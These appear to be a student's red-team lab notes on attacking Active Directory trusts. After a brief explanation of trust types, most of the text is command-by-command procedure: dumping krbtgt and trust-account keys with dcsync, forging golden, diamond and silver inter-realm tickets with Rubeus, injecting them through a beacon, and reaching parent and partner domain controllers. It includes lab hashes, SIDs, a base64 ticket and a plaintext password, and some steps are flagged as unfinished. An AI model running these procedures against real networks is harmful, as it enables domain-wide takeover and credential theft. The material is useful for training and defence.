TRUSTS
The purpose of a trust is to allow one forest or domain to share its resources with another.  Trusts can exist between domains in the same forest, between domains in different forests, and even between entire forests.

Parent/Child Trust
- A two-way, transitive trust that is automatically created when a new domain is added to an existing tree.

Tree-Root Trust
- A two-way, transitive trust that is automatically created when a new domain tree is added to an existing forest.

External Trust
- A one or two-way, non-transitive trust that enables resources to be shared between domains in different forests.

Forest Trust
- A one or two-way transitive trust that enables resources to be shared between different forests.
--------------------------------

Trusted domains: trust information stored in active directory Trusted Domain object (TDO). (Trust type, transitivity, and shared password used to create it. Password rotates every 30 days. TDO's can be read.

beacon> ldapsearch (objectClass=trustedDomain)
- Find trusts

Inter-Realm Tickets (referal tickets)

Client --> TGS-REQ to its own KDC, The request includes:
- Real: <--Trusted Domain
-SNameString; TERMSERV
sNameString: par-jmp.partner <-- Trusting realm.

Returns a TGS-REP containig an inter realm TGT, from trusted realm but is encrypted using shared inter-relm key instead of KRBTGT
TGT comes back
- Realm<-- trusted realm
- SPN
-- SNameString: krbgt
-- SnameString: Partner.com <-- trusting realm.
client  uses inter-realm tgt to send another TGS-REQ This time directly to the trusting realm.

Can see with: ldapsearch (samAccountType=805306370) --attributes samAccountName
--------------------------------------------------------

Parent / Child Trusts: can create a golden ticket to own all domains.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887-519 /nowrap
- aes child domain aes256
user is who we want to impersonate
domain is child domain
sid of the child domain
sids list of sids you want in ticket sid history

You can get the parent's domain SID via LDAP by querying a domain controller within that domain.  Make sure to set the query base to that of the parent domain's distinguished name.

beacon> ldapsearch (objectClass=domain) --attributes objectSid --hostname lon-dc-1.contoso.com --dn DC=contoso,DC=com
â€‹
Or it can be created using the diamond technique:
beacon> exexecute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap

/tgtdeleg gets a usable TGT for the current user.
/ticketuser is the user you want to impersonate.
/ticketuserid is the RID of the impersonated user.
/sids is a list of SIDs you want in the ticket's SID history.
/krbkey is the AES256 hash of the child domain's krbtgt account. 

PARENT CHILD TRUST LAB (High Integrity beacon)
1 - Enumerate trust:  ldapsearch (objectClass=trustedDomain) --attributes trustPartner,trustDirection,trustAttributes,flatName
2 - Obtain the aes25 hash for child domain krbtgt account:  dcsync child.parent.com Child\krbtgt <--domain
--- 2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9
3 - Obtain domain sid for child: ldapsearch (objectClass=domain) --attributes objectSid  
-- objectSid: S-1-5-21-690277740-3036021016-2883941857-502 <-- missing with the ldap
4 - Obtain Domain Sid for Parent: ldapsearch (objectClass=domain) --attributes objectSid --hostname domain_controller.domain.com --dn DC=domain,DC=com
-- objectSid: S-1-5-21-3926355307-1661546229-813047887
5 - Forge Golden ticket on Attacker desktop
-- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:child.domain.com /sid:[child SID] /sids:[Parent SID-512] /aes256:[CHILD KRBTGT HASH] /outfile:C:\Users\Attacker\Desktop\golden <--512 DOMAIN ADMIN
-- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /user:Administrator /domain:dublin.contoso.com /sid:S-1-5-21-690277740-3036021016-2883941857 /sids:S-1-5-21-3926355307-1661546229-813047887 /aes256:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /outfile:C:\Users\Attacker\Desktop\gold
6- Inject ticket into Beacon: 
-- kerberos_ticket_use C:\Users\Attacker\Desktop\[TICKET]
7- run klist
8 - Access parent dc
-- ls \\lon-dc-1\c$

** IF GOLDEN DONT WORK USE DIAMOND ** NEEDS FIXED

/tgtdeleg gets a usable TGT for the current user.
/ticketuser is the user you want to impersonate.
/ticketuserid is the RID of the impersonated user.
/sids is a list of SIDs you want in the ticket's SID history.
/krbkey is the AES256 hash of the child domain's krbtgt account. 

execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:domain_SID-512 /krbkey:CHILD_AESHASH_Krbtgt /nowrap
- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /sids:S-1-5-21-3926355307-1661546229-813047887-512 /krbkey:2eabe80498cf5c3c8465bb3d57798bc088567928bb1186f210c92c1eb79d66a9 /nowrap
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /user:Adinistrator /ticket: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
 /service:CIFS/lon-dc-1
--------------------------------------------------

One Way Inbound Trusts (inbound trust) : TrustDirection:1 <-- 1 is inbound

1 - Who are you and your domain: getuid
2 - beacon> ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname <-- Look at trust direction line
3 - beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com <-- Check foreignSecurityPrincipal, principals form a external domain that are trusted and and allowed to be come a group in the trusted domain.. 
-- We are in contoso and have 1 trust direction to partner.com so we check the foreignSecurityPrincipal on partner.
-- we are not interested in the default values S-1-5-4, S-1-5-11, S-1-5-17, S-1-5-9
4 - beacon> ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) <-- Replace with the SID weare interested in that exists in the trusted domain 
5 - beacon> ldapsearch (samAccountType=805306369) --attributes samAccountName --dn DC=partner,DC=com --hostname partner.com <-- replace with the correct DC and hostname
-- could use bofhound to feed data to bloodhound.

Forging Referal Tickets
6 - beacon> dcsync contoso.com CONTOSO\PARTNER$ <-- replace domain\Principal with data you need, need to be DA run make_token contoso\dyork Passw0rd!
-- get RC4 hash, rev2self
7- C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /user:pchilds /domain:CONTOSO.COM /sid:S-1-5-21-3926355307-1661546229-813047887 /id:1105 /groups:513,1106,6102 /service:krbtgt/partner.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap
-- /user:pchilds <-- from getuid
-- /domain:Contoso.com <-- from getuid
-- /sid: <-- from step 3 above, SID of trusted domain
-- /id: <--RID of impersonated user
-- /groups are the RIDs of the impersonated user's domain groups.  Domain Users is 513, Workstation Admins is 1106, and Partner Jump Users is 6102. <--Replace the 6102 with the actual
-- /service is the krbtgt service of trusting domain
-- /rc4 is inter realm key from step 6 above
** if forging off line imperative to get group membership correct can also use the /ldap flag in rubeus to do it online.
Above forged a inter-realm TGT that we can use to request service ticket from the trusting domain via rubeus asktgs command

8- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/par-jmp-1.partner.com /dc:par-dc-1.partner.com /ticket:[TICKET FROM STEP 7] /nowrap
-- /service is the target service in the trusting domain.
-- /dc is a domain controller in the trusting domain.
-- /ticket is the inter-realm TGT.
9 - execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET] <-- inject ticket

10 - Run Klist to check
11 - ls \\par-jmp-1.partner.com\c$ <-- connect for the flag
------------------------------------------------------------------

One Way Outbound Trusts <-- TrustDirection:2 <-- 2 is outbound
----------------------------

1 - Who are you and your domain: getuid
2 - beacon> ldapsearch (objectClass=trustedDomain) <-- Look for TrustDirection Line it will have the #2 which is a outbound trust
beacon> ldapsearch (objectClass=foreignSecurityPrincipal) --attributes cn,memberOf --hostname partner.com --dn DC=partner,DC=com <-- THIS WILL FAIL!!!! We do not have access 
3- HOWEVER if we have a principal in the trusted domain we can impersonate them
-- EX. make_token contose\Administrator Passw0rd!
   -- ls \\lon-dc-1.contoso.com\c$ <-- will work
4- beacon> ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID <-- grab the objectguid
5- beacon> mimikatz lsadump::dcsync /domain:partner.com /guid:{288d9ee6-2b3c-42aa-bef8-959ab4e484ed} <--objectguid from above\
6- execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:PARTNER$ /domain:CONTOSO.COM /dc:lon-dc-1.contoso.com /rc4:6150491cceb080dffeaaec5e60d8f58d /nowrap <-- use the RC4 key from above to ask for a trt
-- make_token contoso\PARTNER$ FAKEPAss
7- Inject the ticket:  execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:[TICKET]
8- Run klist to check
9- We should now be able to enumerate and carry out other actions <-- works cause the primarygroupid of the trust account is 513, which grants us domain user access with out being a explicit member.
-- ldapsearch (objectClass=domain) --dn DC=contoso,DC=com --attributes name,objectSid --hostname contoso.com
-- we can now look for additional attack paths. 

